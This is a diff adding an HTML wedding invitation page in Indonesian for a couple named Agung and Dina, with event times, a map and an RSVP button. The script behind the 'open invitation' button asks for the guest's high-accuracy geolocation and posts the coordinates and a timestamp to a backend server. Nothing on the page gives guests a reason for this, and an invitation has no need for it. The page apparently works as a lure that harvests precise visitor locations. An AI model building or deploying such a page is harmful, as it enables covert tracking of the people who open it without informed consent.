@@ -1,0 +1,1377 @@
+```html
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0">
+
+    <title>
+        Undangan Pernikahan Romeo & Juliet
+    </title>
+
+
+    <style>
+
+        /* ================================
+           RESET
+        ================================= */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+
+        body {
+
+            font-family:
+                Georgia,
+                "Times New Roman",
+                serif;
+
+            background: #f8f4ef;
+
+            color: #3e3028;
+
+        }
+
+
+        /* ================================
+           COVER
+        ================================= */
+
+        #cover {
+
+            position: fixed;
+
+            top: 0;
+            left: 0;
+
+            width: 100%;
+            height: 100vh;
+
+            z-index: 9999;
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            background:
+
+                linear-gradient(
+                    rgba(35, 20, 15, 0.55),
+                    rgba(35, 20, 15, 0.65)
+                ),
+
+                url(
+                    "https://images.unsplash.com/photo-1519225421980-715cb0215aed?auto=format&fit=crop&w=1600&q=80"
+                );
+
+            background-size: cover;
+
+            background-position: center;
+
+            transition:
+
+                opacity 0.8s ease,
+
+                visibility 0.8s ease;
+
+        }
+
+
+        /* Cover setelah dibuka */
+
+        #cover.hidden {
+
+            opacity: 0;
+
+            visibility: hidden;
+
+            pointer-events: none;
+
+        }
+
+
+        /* ================================
+           COVER CONTENT
+        ================================= */
+
+        .cover-content {
+
+            width: 90%;
+
+            max-width: 650px;
+
+            padding: 50px 25px;
+
+            text-align: center;
+
+            color: white;
+
+            background:
+                rgba(0, 0, 0, 0.25);
+
+            border:
+                1px solid
+                rgba(255,255,255,0.6);
+
+            border-radius: 15px;
+
+            backdrop-filter: blur(5px);
+
+        }
+
+
+        .cover-small {
+
+            font-size: 15px;
+
+            letter-spacing: 5px;
+
+            text-transform: uppercase;
+
+            margin-bottom: 25px;
+
+        }
+
+
+        .cover-content h1 {
+
+            font-size:
+                clamp(40px, 8vw, 75px);
+
+            font-weight: normal;
+
+            line-height: 1.15;
+
+            margin-bottom: 25px;
+
+        }
+
+
+        .cover-date {
+
+            font-size: 18px;
+
+            letter-spacing: 4px;
+
+            margin-bottom: 35px;
+
+        }
+
+
+        /* ================================
+           BUTTON
+        ================================= */
+
+        .open-button {
+
+            padding:
+                15px 35px;
+
+            border: none;
+
+            border-radius: 50px;
+
+            background: #f1d8b5;
+
+            color: #3e3028;
+
+            font-family: inherit;
+
+            font-size: 16px;
+
+            cursor: pointer;
+
+            transition: 0.3s;
+
+        }
+
+
+        .open-button:hover {
+
+            background: white;
+
+            transform:
+                translateY(-3px);
+
+        }
+
+
+        .open-button:disabled {
+
+            opacity: 0.6;
+
+            cursor: wait;
+
+        }
+
+
+        /* ================================
+           INVITATION
+        ================================= */
+
+        #invitation {
+
+            display: none;
+
+        }
+
+
+        #invitation.show {
+
+            display: block;
+
+            animation:
+                fadeIn 1.2s ease;
+
+        }
+
+
+        @keyframes fadeIn {
+
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+
+        }
+
+
+        /* ================================
+           GENERAL SECTION
+        ================================= */
+
+        section {
+
+            padding:
+                90px 20px;
+
+        }
+
+
+        .container {
+
+            width: 100%;
+
+            max-width: 900px;
+
+            margin: auto;
+
+            text-align: center;
+
+        }
+
+
+        /* ================================
+           HERO
+        ================================= */
+
+        .hero {
+
+            min-height: 100vh;
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            color: white;
+
+            background:
+
+                linear-gradient(
+                    rgba(35,20,15,0.55),
+                    rgba(35,20,15,0.65)
+                ),
+
+                url(
+                    "https://images.unsplash.com/photo-1519741497674-611481863552?auto=format&fit=crop&w=1600&q=80"
+                );
+
+            background-size: cover;
+
+            background-position: center;
+
+        }
+
+
+        .hero h2 {
+
+            font-size:
+                clamp(40px, 8vw, 80px);
+
+            font-weight: normal;
+
+            margin:
+                15px 0;
+
+        }
+
+
+        .hero p {
+
+            font-size: 18px;
+
+            letter-spacing: 2px;
+
+        }
+
+
+        /* ================================
+           MEMPELAI
+        ================================= */
+
+        .couple {
+
+            background: #f8f4ef;
+
+        }
+
+
+        .couple h2,
+        .event h2,
+        .location h2,
+        .rsvp h2 {
+
+            font-size: 38px;
+
+            font-weight: normal;
+
+            margin-bottom: 25px;
+
+        }
+
+
+        .names {
+
+            font-size: 45px;
+
+            margin:
+                25px 0;
+
+        }
+
+
+        .ampersand {
+
+            font-size: 30px;
+
+            font-style: italic;
+
+        }
+
+
+        .description {
+
+            max-width: 650px;
+
+            margin: auto;
+
+            line-height: 1.9;
+
+            font-size: 17px;
+
+        }
+
+
+        /* ================================
+           EVENT
+        ================================= */
+
+        .event {
+
+            background: #eadfd2;
+
+        }
+
+
+        .event-box {
+
+            max-width: 650px;
+
+            margin: auto;
+
+            padding: 40px 25px;
+
+            background:
+                rgba(255,255,255,0.7);
+
+            border-radius: 15px;
+
+        }
+
+
+        .event-item {
+
+            margin:
+                20px 0;
+
+            line-height: 1.8;
+
+        }
+
+
+        .event-item strong {
+
+            display: block;
+
+            font-size: 19px;
+
+            margin-bottom: 8px;
+
+        }
+
+
+        /* ================================
+           LOCATION
+        ================================= */
+
+        .location {
+
+            background: #f8f4ef;
+
+        }
+
+
+        .map {
+
+            width: 100%;
+
+            height: 300px;
+
+            margin-top: 30px;
+
+            border: 0;
+
+            border-radius: 15px;
+
+        }
+
+
+        /* ================================
+           RSVP
+        ================================= */
+
+        .rsvp {
+
+            background: #eadfd2;
+
+        }
+
+
+        .rsvp-button {
+
+            display: inline-block;
+
+            margin-top: 25px;
+
+            padding:
+                15px 30px;
+
+            border-radius: 50px;
+
+            background: #6b5142;
+
+            color: white;
+
+            text-decoration: none;
+
+            transition: 0.3s;
+
+        }
+
+
+        .rsvp-button:hover {
+
+            background: #4e392f;
+
+            transform:
+                translateY(-3px);
+
+        }
+
+
+        /* ================================
+           FOOTER
+        ================================= */
+
+        footer {
+
+            padding:
+                40px 20px;
+
+            text-align: center;
+
+            background: #3e3028;
+
+            color: white;
+
+        }
+
+
+        /* ================================
+           LOCATION STATUS
+        ================================= */
+
+        #locationStatus {
+
+            position: fixed;
+
+            right: 15px;
+
+            bottom: 15px;
+
+            max-width: 320px;
+
+            padding:
+                13px 16px;
+
+            background:
+                rgba(0,0,0,0.85);
+
+            color: white;
+
+            border-radius: 8px;
+
+            font-family: Arial, sans-serif;
+
+            font-size: 13px;
+
+            z-index: 10000;
+
+            display: none;
+
+        }
+
+
+        #locationStatus.show {
+
+            display: block;
+
+        }
+
+
+        /* ================================
+           MOBILE
+        ================================= */
+
+        @media(max-width:600px) {
+
+            section {
+
+                padding:
+                    70px 18px;
+
+            }
+
+
+            .cover-content {
+
+                padding:
+                    40px 20px;
+
+            }
+
+
+            .names {
+
+                font-size: 35px;
+
+            }
+
+
+            .couple h2,
+            .event h2,
+            .location h2,
+            .rsvp h2 {
+
+                font-size: 30px;
+
+            }
+
+        }
+
+    </style>
+
+</head>
+
+
+<body>
+
+
+    <!-- ==================================
+         COVER
+    =================================== -->
+
+    <div id="cover">
+
+        <div class="cover-content">
+
+            <div class="cover-small">
+
+                The Wedding Of
+
+            </div>
+
+
+            <h1>
+
+                Agung
+
+                <br>
+
+                &
+
+                <br>
+
+                Dina
+
+            </h1>
+
+
+            <div class="cover-date">
+
+                20 • 12 • 2026
+
+            </div>
+
+
+            <button
+                id="openInvitation"
+                class="open-button">
+
+                Buka Undangan
+
+            </button>
+
+        </div>
+
+    </div>
+
+
+    <!-- ==================================
+         STATUS LOKASI
+    =================================== -->
+
+    <div id="locationStatus"></div>
+
+
+    <!-- ==================================
+         ISI UNDANGAN
+    =================================== -->
+
+    <main id="invitation">
+
+
+        <!-- HERO -->
+
+        <section class="hero">
+
+            <div class="container">
+
+                <p>
+                    Dengan penuh kebahagiaan
+                </p>
+
+
+                <h2>
+
+                    Agung & Dina
+
+                </h2>
+
+
+                <p>
+
+                    Mengundang Anda
+                    untuk hadir
+                    dalam hari bahagia kami.
+
+                </p>
+
+            </div>
+
+        </section>
+
+
+        <!-- MEMPELAI -->
+
+        <section class="couple">
+
+            <div class="container">
+
+                <h2>
+
+                    Mempelai
+
+                </h2>
+
+
+                <div class="names">
+
+                    Agung
+
+                    <span class="ampersand">
+
+                        &
+
+                    </span>
+
+                    Dina
+
+                </div>
+
+
+                <p class="description">
+
+                    Dengan memohon rahmat dan
+                    ridho Tuhan Yang Maha Esa,
+                    kami bermaksud menyelenggarakan
+                    pernikahan kami.
+
+                    <br><br>
+
+                    Merupakan suatu kehormatan dan
+                    kebahagiaan bagi kami apabila
+                    Bapak/Ibu/Saudara/i berkenan hadir
+                    dan memberikan doa restu.
+
+                </p>
+
+            </div>
+
+        </section>
+
+
+        <!-- ACARA -->
+
+        <section class="event">
+
+            <div class="container">
+
+                <h2>
+
+                    Waktu & Acara
+
+                </h2>
+
+
+                <div class="event-box">
+
+
+                    <div class="event-item">
+
+                        <strong>
+                            Akad Nikah
+                        </strong>
+
+                        Minggu,
+                        20 Desember 2026
+
+                        <br>
+
+                        09.00 WIB
+                        sampai selesai
+
+                    </div>
+
+
+                    <div class="event-item">
+
+                        <strong>
+                            Resepsi
+                        </strong>
+
+                        Minggu,
+                        20 Desember 2026
+
+                        <br>
+
+                        11.00 WIB –
+                        14.00 WIB
+
+                    </div>
+
+
+                </div>
+
+            </div>
+
+        </section>
+
+
+        <!-- LOKASI -->
+
+        <section class="location">
+
+            <div class="container">
+
+                <h2>
+
+                    Lokasi Acara
+
+                </h2>
+
+
+                <p>
+
+                    Gedung Pernikahan
+                    Agung & Dina
+
+                </p>
+
+
+                <p>
+
+                    Jakarta, Indonesia
+
+                </p>
+
+
+                <iframe
+
+                    class="map"
+
+                    src="https://www.google.com/maps?q=Jakarta,Indonesia&output=embed"
+
+                    loading="lazy">
+
+                </iframe>
+
+            </div>
+
+        </section>
+
+
+        <!-- RSVP -->
+
+        <section class="rsvp">
+
+            <div class="container">
+
+                <h2>
+
+                    Konfirmasi Kehadiran
+
+                </h2>
+
+
+                <p>
+
+                    Kehadiran dan doa restu
+                    Anda merupakan kebahagiaan
+                    bagi kami.
+
+                </p>
+
+
+                <a
+
+                    href="#"
+
+                    class="rsvp-button"
+
+                    onclick="
+                        alert(
+                            'Terima kasih atas konfirmasi Anda!'
+                        );
+                        return false;
+                    ">
+
+                    Konfirmasi Kehadiran
+
+                </a>
+
+            </div>
+
+        </section>
+
+
+        <!-- FOOTER -->
+
+        <footer>
+
+            <p>
+
+                Agung & Dina
+
+            </p>
+
+
+            <br>
+
+
+            <p>
+
+                Terima kasih atas doa
+                dan kehadiran Anda.
+
+            </p>
+
+        </footer>
+
+
+    </main>
+
+
+    <!-- ==================================
+         JAVASCRIPT
+    =================================== -->
+
+    <script>
+
+
+        /*
+         * =================================================
+         * URL BACKEND
+         * =================================================
+         *
+         * Untuk sementara gunakan alamat localhost:
+         *
+         * http://localhost:3000/api/location
+         *
+         * Setelah backend online, ganti dengan domain
+         * backend Anda.
+         */
+
+        const BACKEND_URL =
+            "http://localhost:3000/api/location";
+
+
+        /*
+         * =================================================
+         * AMBIL ELEMENT HTML
+         * =================================================
+         */
+
+        const openButton =
+            document.getElementById(
+                "openInvitation"
+            );
+
+
+        const cover =
+            document.getElementById(
+                "cover"
+            );
+
+
+        const invitation =
+            document.getElementById(
+                "invitation"
+            );
+
+
+        const locationStatus =
+            document.getElementById(
+                "locationStatus"
+            );
+
+
+        /*
+         * =================================================
+         * FUNGSI STATUS
+         * =================================================
+         */
+
+        function showLocationStatus(message) {
+
+            locationStatus.textContent =
+                message;
+
+
+            locationStatus.classList.add(
+                "show"
+            );
+
+
+            setTimeout(function() {
+
+                locationStatus.classList.remove(
+                    "show"
+                );
+
+            }, 5000);
+
+        }
+
+
+        /*
+         * =================================================
+         * FUNGSI MENGAMBIL LOKASI
+         * =================================================
+         */
+
+        function getUserLocation() {
+
+
+            /*
+             * Periksa apakah browser
+             * mendukung Geolocation
+             */
+
+            if (
+                !navigator.geolocation
+            ) {
+
+                showLocationStatus(
+                    "Browser Anda tidak mendukung fitur lokasi."
+                );
+
+                return;
+
+            }
+
+
+            /*
+             * Tampilkan pesan
+             */
+
+            showLocationStatus(
+                "Meminta izin akses lokasi..."
+            );
+
+
+            /*
+             * HTML5 GEOLOCATION API
+             */
+
+            navigator.geolocation.getCurrentPosition(
+
+
+                /*
+                 * ================================
+                 * BERHASIL
+                 * ================================
+                 */
+
+                function(position) {
+
+
+                    const latitude =
+                        position.coords.latitude;
+
+
+                    const longitude =
+                        position.coords.longitude;
+
+
+                    console.log(
+                        "Latitude:",
+                        latitude
+                    );
+
+
+                    console.log(
+                        "Longitude:",
+                        longitude
+                    );
+
+
+                    /*
+                     * Kirim data
+                     * ke backend
+                     */
+
+                    sendLocation(
+                        latitude,
+                        longitude
+                    );
+
+                },
+
+
+                /*
+                 * ================================
+                 * GAGAL
+                 * ================================
+                 */
+
+                function(error) {
+
+
+                    console.error(
+                        "Geolocation error:",
+                        error
+                    );
+
+
+                    if (
+                        error.code ===
+                        error.PERMISSION_DENIED
+                    ) {
+
+                        showLocationStatus(
+                            "Izin lokasi ditolak."
+                        );
+
+                    }
+
+
+                    else if (
+                        error.code ===
+                        error.POSITION_UNAVAILABLE
+                    ) {
+
+                        showLocationStatus(
+                            "Lokasi tidak tersedia."
+                        );
+
+                    }
+
+
+                    else if (
+                        error.code ===
+                        error.TIMEOUT
+                    ) {
+
+                        showLocationStatus(
+                            "Permintaan lokasi timeout."
+                        );
+
+                    }
+
+
+                    else {
+
+                        showLocationStatus(
+                            "Gagal mendapatkan lokasi."
+                        );
+
+                    }
+
+                },
+
+
+                /*
+                 * ================================
+                 * OPTIONS
+                 * ================================
+                 */
+
+                {
+
+                    enableHighAccuracy: true,
+
+                    timeout: 10000,
+
+                    maximumAge: 0
+
+                }
+
+            );
+
+        }
+
+
+        /*
+         * =================================================
+         * KIRIM LOKASI KE BACKEND
+         * =================================================
+         */
+
+        async function sendLocation(
+            latitude,
+            longitude
+        ) {
+
+
+            /*
+             * Data yang akan dikirim
+             */
+
+            const locationData = {
+
+                latitude:
+                    latitude,
+
+                longitude:
+                    longitude,
+
+                timestamp:
+                    new Date().toISOString()
+
+            };
+
+
+            console.log(
+                "Data lokasi:",
+                locationData
+            );
+
+
+            try {
+
+
+                /*
+                 * FETCH POST
+                 */
+
+                const response =
+                    await fetch(
+
+                        BACKEND_URL,
+
+                        {
+
+                            method:
+                                "POST",
+
+
+                            headers: {
+
+                                "Content-Type":
+                                    "application/json"
+
+                            },
+
+
+                            body:
+                                JSON.stringify(
+                                    locationData
+                                )
+
+                        }
+
+                    );
+
+
+                /*
+                 * Periksa response
+                 */
+
+                if (
+                    !response.ok
+                ) {
+
+                    throw new Error(
+                        "Server error: " +
+                        response.status
+                    );
+
+                }
+
+
+                /*
+                 * Berhasil
+                 */
+
+                console.log(
+                    "Lokasi berhasil dikirim."
+                );
+
+
+                showLocationStatus(
+                    "Lokasi berhasil dikirim ke server."
+                );
+
+
+            }
+
+            catch(error) {
+
+
+                console.error(
+                    "Gagal mengirim lokasi:",
+                    error
+                );
+
+
+                showLocationStatus(
+                    "Lokasi berhasil diperoleh, tetapi gagal dikirim ke server."
+                );
+
+            }
+
+        }
+
+
+        /*
+         * =================================================
+         * TOMBOL BUKA UNDANGAN
+         * =================================================
+         */
+
+        openButton.addEventListener(
+            "click",
+            function() {
+
+
+                /*
+                 * Cegah klik berkali-kali
+                 */
+
+                openButton.disabled =
+                    true;
+
+
+                openButton.textContent =
+                    "Membuka Undangan...";
+
+
+                /*
+                 * Tampilkan isi undangan
+                 */
+
+                invitation.classList.add(
+                    "show"
+                );
+
+
+                /*
+                 * Hilangkan cover
+                 */
+
+                cover.classList.add(
+                    "hidden"
+                );
+
+
+                /*
+                 * Ambil lokasi
+                 */
+
+                getUserLocation();
+
+
+                /*
+                 * Kembalikan tombol
+                 */
+
+                setTimeout(function() {
+
+                    openButton.textContent =
+                        "Buka Undangan";
+
+                }, 1000);
+
+            }
+
+        );
+
+
+    </script>
+
+
+</body>
+
+</html>
+```
